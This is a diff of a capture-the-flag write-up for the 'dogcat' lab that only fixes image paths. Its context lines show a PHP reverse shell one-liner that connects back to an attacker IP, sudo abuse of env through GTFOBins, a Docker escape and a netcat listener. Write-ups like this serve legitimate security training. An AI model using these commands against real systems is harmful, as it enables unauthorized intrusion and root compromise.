@@ -186,7 +186,7 @@ Now I use the following PHP reverse shell oneliner from pentestmonkey.net
 php -r '$sock=fsockopen("10.11.11.11",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-![LFI to reverse shell](\Images\thm_dogcat_burpsuit_2.jpg)
+![LFI to reverse shell](/Images/thm_dogcat_burpsuit_2.jpg)
 
 I had to URL encode all characters in the php reverse shell code to get it to work properly.
 
@@ -207,7 +207,7 @@ I do a the following sudo command to see what I can execute as sudo.
 sudo -l
 ```
 
-![SUDO Privilege Escalation via env](\Images\thm_dogcat_flag3.jpg)
+![SUDO Privilege Escalation via env](/Images/thm_dogcat_flag3.jpg)
 
 I see that I can execute /usr/bin/env as sudo. I go to GTFOBins and find a way to escalate my privileges to root.
 
@@ -235,7 +235,7 @@ chmod +x linpeas.sh
 
 I noticed two odd things that indicated that we were in a docker container. The first being a random hostname and the second being the .dockerenv file.
 
-![Docker Files](\Images\thm_dogcat_docker.jpg)
+![Docker Files](/Images/thm_dogcat_docker.jpg)
 
 ## Escaping Docker Container
 
@@ -250,6 +250,6 @@ Run a listener on the attacking machine and get root shell.
 sudo nc -nvlp 9001
 ```
 
-![Root and Flag 4](\Images\thm_dogcat_root_and_flag4.jpg)
+![Root and Flag 4](/Images/thm_dogcat_root_and_flag4.jpg)
 
 That marks the end of this system, obtaining all 4 flags.
